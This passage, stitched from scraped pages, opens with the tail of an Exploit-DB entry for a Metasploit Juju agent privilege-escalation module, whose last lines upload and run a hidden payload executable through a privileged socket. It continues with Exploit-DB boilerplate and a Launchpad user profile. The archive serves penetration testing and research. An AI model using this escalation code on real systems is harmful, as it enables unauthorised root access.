      fail_with Failure::NotVulnerable, 'Could not find any Juju units using a privileged socket'
    end

    # Upload payload executable
    payload_name = ".#{rand_text_alphanumeric rand(5..10)}"
    payload_path = "#{datastore['WritableDir']}/#{payload_name}"
    upload_and_chmodx payload_path, generate_payload_exe

    # Execute payload executable
    vprint_status 'Executing payload...'
    execute_command payload_path, 'unit' => socket_unit
  end
end

```

**Tags:**
[Metasploit Framework (MSF)](/?tag=3)

**Advisory/Source:**
[Link](https://raw.githubusercontent.com/rapid7/metasploit-framework/321b78b0fe8fd515d1efab64996f11b4eecbc27d/modules/exploits/linux/local/juju_run_agent_priv_esc.rb)

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/statistics) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Databases
[Exploits](/)
[Google Hacking](/google-hacking-database)
[Papers](/papers)
[Shellcodes](/shellcodes)

Links
[Search Exploit-DB](/search)
[Submit Entry](/submit)
[SearchSploit Manual](/searchsploit)
[Exploit Statistics](/statistics)

Sites
[OffSec](https://www.offsec.com)
[Kali Linux](https://www.kali.org/)
[VulnHub](https://www.vulnhub.com)

Solutions
[Courses and Certifications](https://www.offsec.com/courses-and-certifications/)
[Learn Subscriptions](https://www.offsec.com/learn/)
[OffSec Cyber Range](https://www.offsec.com/cyber-range/)
[Proving Grounds](https://www.offsec.com/labs/)
[Penetration Testing Services](https://www.offsec.com/penetration-testing/)

* [Exploit Database by OffSec](/)
* [Terms](/terms)
* [Privacy](/privacy)
* [About Us](/about-exploit-db)
* [FAQ](/faq)
* [Cookies](/cookies)

©
[OffSec Services Limited](https://www.offsec.com/) 2025. All rights reserved.

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

Close

##### OffSec Resources

×

| **Databases** | **Links** | **Sites** | **Solutions** |
| [Exploits](/) | [Search Exploit-DB](/search) | [OffSec](https://www.offsec.com/) | [Courses and Certifications](https://www.offsec.com/courses-and-certifications/) |
| [Google Hacking](/google-hacking-database) | [Submit Entry](/submit) | [Kali Linux](https://www.kali.org/) | [Learn Subscriptions](https://www.offsec.com/learn/) |
| [Papers](/papers) | [SearchSploit Manual](/serchsploit) | [VulnHub](https://www.vulnhub.com/) | [OffSec Cyber Range](https://www.offsec.com/cyber-range/) |
|  | [Proving Grounds](https://www.offsec.com/labs/) |
| [Shellcodes](/shellcodes) | [Exploit Statistics](/serchsploit) |  | [Proving Grounds](https://www.offsec.com/labs/) |
|  |  |  | [Penetration Testing Services](https://www.offsec.com/penetration-testing/) |

Close

##### Search The Exploit Database

×

Title

CVE

Type

dos

local

remote

shellcode

papers

webapps

Platform

AIX

ASP

BSD

BSD\_PPC

BSD\_x86

BSDi\_x86

CGI

FreeBSD

FreeBSD\_x86

FreeBSD\_x86-64

Generator

Hardware

HP-UX

IRIX

JSP

Linux

Linux\_MIPS

Linux\_PPC

Linux\_SPARC

Linux\_x86

Linux\_x86-64

MINIX

Multiple

NetBSD\_x86

Novell

OpenBSD

OpenBSD\_x86

OSX\_PPC

OSX

PHP

Plan9

QNX

SCO

SCO\_x86

Solaris

Solaris\_SPARC

Solaris\_x86

Tru64

ULTRIX

Unix

UnixWare

Windows\_x86

Windows\_x86-64

Windows

ARM

CFM

Netware

SuperH\_SH4

Java

BeOS

Immunix

Palm\_OS

AtheOS

iOS

Android

XML

Perl

Python

System\_z

JSON

ASHX

Ruby

ASPX

macOS

Linux\_CRISv32

eZine

Magazine

NodeJS

Alpha

Solaris\_MIPS

Lua

watchOS

VxWorks

Python2

Python3

TypeScript

Go

Author

Content

Port

14

21

22

23

25

42

49

53

66

69

70

79

80

81

102

105

110

111

113

119

123

135

139

143

161

162

164

383

389

402

406

411

443

444

445

446

502

504

513

514

515

532

548

554

555

617

623

631

655

689

783

787

808

873

888

901

998

1000

1040

1089

1099

1100

1114

1120

1194

1235

1471

1521

1533

1581

1589

1604

1617

1723

1743

1761

1812

1858

1861

1900

1947

2000

2022

2049

2100

2103

2121

2125

2181

2242

2315

2375

2380

2381

2401

2480

2525

2640

2810

2812

2947

2954

2990

3000

3030

3050

3052

3128

3129

3181

3200

3217

3306

3333

3378

3389

3460

3465

3500

3535

3632

3690

3790

3814

3817

4000

4002

4070

4081

4105

4111

4322

4343

4434

4444

4501

4555

4592

4661

4750

4848

5000

5060

5061

5080

5081

5093

5151

5180

5247

5250

5272

5308

5432

5466

5554

5555

5600

5655

5666

5800

5803

5814

5858

5900

5984

6066

6070

6080

6082

6101

6112

6129

6379

6502

6503

6660

6667

7001

7002

7070

7071

7080

7100

7144

7210

7272

7290

7426

7443

7510

7547

7649

7770

7777

7778

7787

7879

7902

8000

8001

8002

8004

8008

8020

8022

8023

8028

8030

8080

8081

8082

8088

8090

8181

8300

8400

8443

8445

8473

8500

8585

8619

8800

8812

8839

8880

8888

9000

9001

9002

9080

9090

9091

9100

9124

9200

9251

9256

9443

9447

9784

9788

9855

9876

9900

9987

9993

9999

10000

10001

10080

10202

10203

10443

10616

11000

11211

11460

12203

12221

12345

12397

12401

13327

13701

13722

13838

16992

18821

18881

19000

19810

19813

20000

20002

20010

20031

20111

20171

22003

23423

25672

26000

27015

27700

28015

30000

30303

31337

32400

32674

32764

34205

37215

37777

37848

38292

40007

41523

44334

46824

48080

49152

50000

50496

52311

52789

52869

52986

53413

54345

54890

55554

55555

56380

57772

58080

62514

Tag

WordPress Core

Metasploit Framework (MSF)

WordPress Plugin

SQL Injection (SQLi)

Cross-Site Scripting (XSS)

File Inclusion (LFI/RFI)

Cross-Site Request Forgery (CSRF)

Denial of Service (DoS)

Code Injection

Command Injection

Authentication Bypass / Credentials Bypass (AB/CB)

Client Side

Use After Free (UAF)

Out Of Bounds

Remote

Local

XML External Entity (XXE)

Integer Overflow

Server-Side Request Forgery (SSRF)

Race Condition

NULL Pointer Dereference

Malware

Buffer Overflow

Heap Overflow

Type Confusion

Object Injection

Bug Report

Console

Pwn2Own

Traversal

Deserialization

Verified

Has App

No Metasploit

Search



=== Content from launchpad.net_c56b497c_20250126_051100.html ===

[Log in / Register](https://launchpad.net/~seth-arnold/%2Blogin)

[![](/@@/person-logo)](https://launchpad.net/~seth-arnold)

## [Seth Arnold](https://launchpad.net/~seth-arnold)

* Overview
* [Code](https://code.launchpad.net/~seth-arnold)
* [Bugs](https://bugs.launchpad.net/~seth-arnold)
* [Blueprints](https://blueprints.launchpad.net/~seth-arnold)
* [Translations](https://translations.launchpad.net/~seth-arnold)
* [Answers](https://answers.launchpad.net/~seth-arnold)

* [Related packages](https://launchpad.net/~seth-arnold/%2Brelated-packages)
* [Related projects](https://launchpad.net/~seth-arnold/%2Brelated-projects)

## User information

Launchpad Id:
seth-arnold

Email:
[Log in](%2Blogin) for email information.

Member since:
2006-05-22

[![Icon of AppArmor Developers](https://launchpadlibrarian.net/65472736/toxie-14.png "Member of AppArmor Developers")](/~apparmor-dev)
[![Icon of Canonical Partner Developers](https://launchpadlibrarian.net/74993564/14.png "Member of Canonical Partner Developers")](/~canonical-partner-dev)
[![Icon of OEM Archive Admins](https://launchpadlibrarian.net/31251458/oem-admin-logo_14x14.png "Member of OEM Archive Admins")](/~oem-archive)
[![Icon of Ubuntu Bug Control](https://launchpadlibrarian.net/4423778/qa-icon.png "Member of Ubuntu Bug Control")](/~ubuntu-bugcontrol)
[![Icon of Ubuntu IRC Team](https://launchpadlibrarian.net/1741440/xchat.png "Member of Ubuntu IRC Team")](/~ubuntu-irc)
[![Icon of Ubuntu LXC Security team](https://launchpadlibrarian.net/673452720/14.png "Member of Ubuntu LXC Security team")](/~ubuntu-lxc-security)
[![Icon of Ubuntu Members](https://launchpadlibrarian.net/606495581/CoF%2014px.png "Member of Ubuntu Members")](/~ubuntumembers)
[![Icon of Ubuntu Security Team](https://launchpadlibrarian.net/1575441/Lock.png "Member of Ubuntu Security Team")](/~ubuntu-security)

Signed Ubuntu Code of Conduct:
Yes

Languages:

English, German

OpenPGP keys:

415010F1BA23C8C720DFB1F5F32172599D8D2E97

SSH keys:

[sarnold@haig](%2Bsshkeys)

Time zone:

America/Los\_Angeles
(UTC-0800)

Karma:
[1749](https://launchpad.net/~seth-arnold/%2Bkarma)
[Karma help](/%2Bhelp-registry/karma.html)

Social accounts:
![IRC](/@@/social-irc "IRC")
**sarnold**
 on
**irc.oftc.net**

![IRC](/@@/social-irc "IRC")
**sarnold**
 on
**irc.libera.chat**

![IRC](/@@/social-irc "IRC")
**sarnold**
 on
**chat.canonical.com**

![Matrix](/@@/social-matrix "Matrix") [**@seth-arnold:ubuntu.com**](https://matrix.to//#/@seth-arnold:ubuntu.com)

## Personal package archives

| [doghouse](/~seth-arnold/%2Barchive/ubuntu/doghouse) |
| --- |
| [testing](/~seth-arnold/%2Barchive/ubuntu/testing) |

## [All memberships](https://launchpad.net/~seth-arnold/%2Bparticipation) Latest memberships

| [Ubuntu Matrix Operators](/~matrix-operators)  Joined on 2024-03-31 | |
| --- | --- |
| [#ubuntu-devel IRC Operators](/~irc-ubuntu-devel-ops)  Joined on 2022-11-01 | |
| [Ubuntu IRC Council](/~ubuntu-irc-council)  Joined on 2021-05-25 | |
| [Ubuntu cloaked people on Libera](/~ubuntu-irc-cloaks)  Joined on 2021-05-10 | |

## [Recent activities](https://launchpad.net/~seth-arnold/%2Bkarma) Most active in

| [Ubuntu CVE Tracker](/ubuntu-cve-tracker) |  |  |  |
| --- | --- | --- | --- |
| [ubuntu-security-tools](/ubuntu-security-tools) |  |  |  |
| [QA Regression Testing](/qa-regression-testing) |  |  |  |
| [Ubuntu](/ubuntu) |  |  |  |
| [Launchpad itself](/launchpad) |  |  |  |

[![Launchpad](/@@/launchpad-footer-logo.svg)](https://launchpad.net/)
 •
[Take the tour](https://launchpad.net/%2Btour)
 •
[Read the guide](https://help.launchpad.net/)

© 2004
[Canonical Ltd.](http://canonical.com/)
 •
[Terms of use](https://launchpad.net/legal)
 •
[Data privacy](https://www.ubuntu.com/legal/dataprivacy)
 •
[Contact Launchpad Support](/feedback)
 •
[Blog](http://blog.launchpad.net/)
 •
[Careers](https://canonical.com/careers)
 •
[System status](https://ubuntu.social/%40launchpadstatus)
 •
4d55102
([Get the code!](https://dev.launchpad.net/))


